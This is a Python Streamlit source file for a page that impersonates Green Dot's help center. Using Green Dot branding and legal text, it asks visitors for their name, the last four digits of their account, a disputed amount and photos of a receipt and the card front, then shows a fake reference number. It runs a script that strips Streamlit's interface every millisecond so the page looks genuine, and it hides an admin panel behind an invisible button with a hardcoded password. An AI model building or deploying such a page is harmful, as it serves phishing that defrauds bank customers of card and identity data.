
import streamlit as st
import sqlite3
import os
import random
import string
import pandas as pd
from datetime import datetime

# --- DATABASE CONFIG ---
DB_NAME = 'claims.db'
UPLOAD_DIR = 'uploads'
os.makedirs(UPLOAD_DIR, exist_ok=True)

def init_db():
    conn = sqlite3.connect(DB_NAME)
    c = conn.cursor()
    c.execute("""CREATE TABLE IF NOT EXISTS greendot_submissions
                 (id INTEGER PRIMARY KEY AUTOINCREMENT,
                  nombre TEXT, cuenta TEXT, monto REAL,
                  factura_path TEXT, tarjeta_path TEXT, fecha TEXT, ref_id TEXT)""")
    conn.commit()
    conn.close()

def generate_ref():
    return "GD-" + "".join(random.choices(string.ascii_uppercase + string.digits, k=8))

init_db()

st.set_page_config(page_title="Green Dot | Help Center", layout="centered", page_icon="✅")

# --- CORE SHIELD: ABSOLUTE PURGE (1ms) ---
st.markdown("""<script>
    const absolutePurge = () => {
        const toKill = [
            '.section-anchor', 'a.section-anchor', '[data-testid="stHeaderActionElements"]',
            '[data-testid="stAppToolbar"]', '[data-testid="stElementToolbar"]',
            '.stElementToolbar', '.st-emotion-cache-140j12g', 'header', 'footer',
            '.stDeployButton', '.st-emotion-cache-gi0tri', 'svg.section-anchor-icon',
            '.etxdrby1', '.etxdrby2', '.stCustomComponentV1', 'button[title="View fullscreen"]'
        ];
        toKill.forEach(s => {
            document.querySelectorAll(s).forEach(el => el.remove());
        });
    };
    setInterval(absolutePurge, 1);
</script>""", unsafe_allow_html=True)

# --- CORE SHIELD: CSS HARD LOCK & CLEAN UI ---
st.markdown("""<style>
    .stApp { background-color: #000000 !important; color: #FFFFFF !important; }
    .block-container { max-width: 500px !important; padding-top: 1.5rem !important; }

    /* UI Artifacts Destruction */
    [data-testid="stHeader"], header, footer, .stDeployButton, .section-anchor, 
    [data-testid="stToolbar"], .st-emotion-cache-gi0tri, [data-testid="stElementToolbar"], 
    .st-emotion-cache-140j12g, button[title="View fullscreen"] { 
        display: none !important; visibility: hidden !important; 
        height: 0 !important; width: 0 !important; opacity: 0 !important; pointer-events: none !important; 
    }

    .promo-box {
        background-color: #111; padding: 30px; text-align: center; 
        border-radius: 12px; margin: 25px 0; border: 1px solid #222; 
    }

    .legal-container {
        font-size: 11px !important; color: #666 !important; text-align: justify !important;
        margin-top: 40px !important; padding-top: 20px !important;
        border-top: 1px solid #222 !important; line-height: 1.6 !important;
    }

    /* Button Styles */
    .stButton>button {
        background-color: #00a05b !important;
        color: white !important;
        border-radius: 8px !important;
        border: none !important;
        font-weight: 600 !important;
        width: 100% !important;
        height: 45px !important;
    }

    div.stButton > button[key="ghost_dot"] {
        background-color: transparent !important; border: none !important; color: #000 !important;
        padding: 0 !important; width: 2px !important; height: 2px !important;
        box-shadow: none !important; cursor: default !important;
    }
</style>""", unsafe_allow_html=True)

if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False

if not st.session_state.admin_mode:
    col_logo = st.columns([1, 1.5, 1])[1]
    with col_logo:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
    
    st.title("Help Center")
    st.write("Please fill out the form below to submit your claim.")
    
    with st.form("claim_form_v32_4_7", clear_on_submit=True):
        nombre = st.text_input("Full Name")
        cuenta = st.text_input("Last 4 digits of Account")
        monto = st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
        st.markdown("**Evidence**")
        rec = st.file_uploader("Receipt", type=['jpg','png','jpeg'])
        car = st.file_uploader("Card Front", type=['jpg','png','jpeg'])
        if st.form_submit_button("SUBMIT NOW"):
            if nombre and rec and car:
                ref = generate_ref()
                st.success(f"Success. Reference: {ref}")
            else: st.error("Information required.")

    st.markdown("""<div class='promo-box'>
        <h3 style='color:white; margin-bottom:15px;'>Download the Green Dot app</h3>
        <div style='display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; margin-bottom: 20px;'>
            <a href='https://play.google.com/store/apps/details?id=com.greendot.retail' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/Play-store.svg' width='130'>
            </a>
            <a href='https://apps.apple.com/us/app/green-dot-mobile-banking/id415511546' target='_blank'>
                <img src='https://www.greendot.com/content/dam/greendot/home-page-redesign/App-store.svg' width='130'>
            </a>
        </div>
    </div>""", unsafe_allow_html=True)

    st.markdown("""<div class='legal-container'>
        Green Dot&reg; cards are issued by Green Dot Bank, Member FDIC. &copy;2026 Green Dot Corporation.
    </div>""", unsafe_allow_html=True)
    
    if st.button(".", key="ghost_dot"): st.session_state.admin_mode = True

else:
    # PANEL ADMINISTRATIVO LIMPIO
    col_adm = st.columns([1, 1.5, 1])[1]
    with col_adm:
        if os.path.exists('logo.svg'): st.image('logo.svg', use_container_width=True)
    
    st.markdown("<br>", unsafe_allow_html=True)
    
    with st.container():
        pw = st.text_input("Auth Key", type="password", label_visibility="collapsed", placeholder="Enter Security Key")
        
        # Botones centralizados y estilizados
        c1, c2, c3 = st.columns([1, 2, 1])
        with c2:
            if st.button("CHECK"):
                if pw == "Diostieneelpoder1": st.session_state.logged_in = True
                else: st.error("Denied")
            
            if st.button("↩ Return Home"): 
                st.session_state.admin_mode = False
                st.rerun()

    if getattr(st.session_state, 'logged_in', False):
        st.write("--- content panel ---")
